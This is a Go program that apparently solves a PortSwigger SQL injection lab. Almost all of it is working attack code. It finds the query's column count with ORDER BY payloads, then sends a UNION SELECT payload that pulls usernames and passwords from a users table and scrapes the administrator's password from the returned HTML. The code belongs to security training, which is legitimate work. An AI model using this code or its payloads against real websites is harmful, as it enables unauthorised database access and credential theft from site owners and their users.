package main

import (
	"errors"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"

	"github.com/PuerkitoBio/goquery"
)

// SQLInjectionTester handles the specific steps of the SQL injection attack.
type SQLInjectionTester struct {
	client    *http.Client
	targetURL string // Base URL of the target lab
}

// makeRequest sends a GET request to the specified URL (including payload).
func (t *SQLInjectionTester) makeRequest(fullURL string) (*http.Response, error) {
	fmt.Printf("[~] Sending request: %s\n", fullURL) // Use ~ for in-progress actions

	req, err := http.NewRequest(http.MethodGet, fullURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request for %s: %w", fullURL, err)
	}

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http request failed for %s: %w", fullURL, err)
	}

	return resp, nil
}

// findNumOfColumns determines the number of columns in the vulnerable query result set
// using the ORDER BY technique.
func (t *SQLInjectionTester) findNumOfColumns() (int, error) {
	baseURL := t.targetURL + uriPath // e.g., https://lab.com/filter?category=abc

	for col := 1; col <= maxColumnSearch; col++ {
		// Craft payload like: '+ORDER+BY+1--
		payload := strings.Replace(payloadToGetNumOfColumns, "{}", strconv.Itoa(col), 1)
		urlWithPayload := baseURL + payload

		resp, err := t.makeRequest(urlWithPayload)
		if err != nil {
			// Don't close body here, as resp might be nil
			return 0, fmt.Errorf("request failed while checking column %d: %w", col, err)
		}

		// Ensure response body is closed even if we don't read it
		defer safeClose(resp.Body)

		// PortSwigger labs often return 500 when ORDER BY index is out of bounds
		if resp.StatusCode == http.StatusInternalServerError {
			correctNumOfColumns := col - 1
			if correctNumOfColumns == 0 {
				return 0, errors.New("received 500 error on first ORDER BY check (column 1), cannot determine columns")
			}
			return correctNumOfColumns, nil
		}

		// Optional: Check for other error codes if needed
		if resp.StatusCode != http.StatusOK {
			fmt.Printf("[!] Unexpected status code %d while checking column %d\n", resp.StatusCode, col)
			// Continue searching, but log it
		}
	}

	return 0, fmt.Errorf("failed to determine number of columns within search limit (%d)", maxColumnSearch)
}

// getAdminPassword performs the UNION attack and extracts the administrator's password.
// It assumes the number of columns is already known.
func (t *SQLInjectionTester) getAdminPassword(numOfColumns int) (string, error) {
	// 1. Generate the UNION SELECT payload
	payload, err := generateUNIONPayload(numOfColumns)
	if err != nil {
		return "", fmt.Errorf("failed to generate UNION payload: %w", err)
	}

	// 2. Execute the attack request
	response, err := t.performSQLAttack(payload)
	if err != nil {
		return "", fmt.Errorf("sql attack execution failed: %w", err)
	}
	// Ensure the response body is closed after we are done reading it
	defer safeClose(response.Body)

	// 3. Read and parse the response body
	bodyBytes, err := io.ReadAll(response.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response body: %w", err)
	}
	responseText := string(bodyBytes)

	// Basic check if the target username appears at all
	if !strings.Contains(responseText, username) {
		return "", fmt.Errorf("response body does not contain the target username '%s'", username)
	}
	fmt.Println("[+] Target username found in response.")

	// 4. Parse the HTML to find the password associated with the username
	// This parsing logic is specific to the expected HTML structure of the lab response.
	doc, err := goquery.NewDocumentFromReader(strings.NewReader(responseText))
	if err != nil {
		return "", fmt.Errorf("failed to parse response HTML: %w", err)
	}

	adminPassword := ""
	// The lab usually presents results in a table. We look for the 'th' containing
	// the username and expect the password to be in the immediately following 'td'.
	doc.Find("th").EachWithBreak(func(_ int, th *goquery.Selection) bool {
		if strings.TrimSpace(th.Text()) == username {
			// Found the username table header, the password should be in the next cell (td)
			passwordCell := th.Next() // Get the sibling element (expected to be <td>)
			if passwordCell.Length() > 0 {
				adminPassword = strings.TrimSpace(passwordCell.Text())
				return false // Stop iterating once found
			}
		}
		return true // Continue iterating
	})

	if adminPassword == "" {
		return "", fmt.Errorf("found username '%s' in HTML, but could not extract password from adjacent cell", username)
	}

	return adminPassword, nil
}

// performSQLAttack sends the final UNION payload and expects a 200 OK response.
// It returns the *http.Response object so the caller can read the body.
func (t *SQLInjectionTester) performSQLAttack(payload string) (*http.Response, error) {
	fullURL := t.targetURL + uriPath + payload

	resp, err := t.makeRequest(fullURL)
	if err != nil {
		// Don't close body here, resp might be nil
		return nil, fmt.Errorf("request failed for attack payload: %w", err)
	}

	// We expect 200 OK if the UNION syntax is correct and retrieves data
	if resp.StatusCode != http.StatusOK {
		// Close body if we are returning an error and not the response object
		safeClose(resp.Body)
		return nil, fmt.Errorf("unexpected status code %d (expected %d) for attack payload", resp.StatusCode, http.StatusOK)
	}

	fmt.Printf("[+] Received expected status code %d for UNION attack.\n", resp.StatusCode)
	// Return the response object; the caller is responsible for closing the body
	return resp, nil
}

// generateUNIONPayload crafts the UNION SELECT part of the SQL injection.
// IMPORTANT: This implementation assumes the first two columns are string-compatible,
// which is true for Lab 5 but not a general guarantee. A more robust solution
// would first identify string-compatible columns.
func generateUNIONPayload(numOfColumns int) (string, error) {
	if numOfColumns < 1 {
		return "", fmt.Errorf("number of columns must be at least 1, got %d", numOfColumns)
	}

	var selectColumns string

	if numOfColumns == 1 {
		// If only one column, concatenate username and password into it.
		// The separator '||'-'||' is specific to Oracle/PostgreSQL. MySQL uses CONCAT().
		// Assuming the lab uses a compatible DB.
		selectColumns = fmt.Sprintf("%s||'~'||%s FROM %s", dbColumnUsername, dbColumnPassword, dbTableName)
	} else {
		// If multiple columns, create a list like: 'username, password, NULL, NULL, ...'
		values := make([]string, numOfColumns)
		// Place target columns in the first available slots.
		// This relies on the assumption that columns 0 and 1 accept string data.
		values[0] = dbColumnUsername
		values[1] = dbColumnPassword
		// Fill the remaining slots with NULL.
		for i := 2; i < numOfColumns; i++ {
			values[i] = "NULL"
		}
		selectColumns = strings.Join(values, ",") + "+FROM+" + dbTableName
	}

	// Inject the crafted SELECT statement into the UNION payload template.
	// Result: '+UNION+SELECT+username,password,NULL+FROM+users--
	payload := strings.Replace(payloadWithUNION, "{}", selectColumns, 1)
	return payload, nil
}
